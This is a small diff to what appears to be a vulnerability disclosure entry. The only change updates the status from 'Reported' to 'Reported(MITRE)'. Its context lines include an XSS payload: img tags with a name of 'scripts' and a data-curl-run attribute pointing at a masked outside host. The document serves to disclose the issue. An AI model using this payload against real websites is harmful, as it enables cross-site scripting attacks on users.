@@ -8,7 +8,7 @@
 + Payload: ```<img name="scripts" data-curl-run="http://xxx.xxx.xxx/"><img name="scripts" data-curl-run="http://xxx.xxx.xxx">```
 + Impact: XSS
 + CVE: N/A
-+ Status: Reported
++ Status: Reported(MITRE)
 + Foundby: TheHulk
 
 
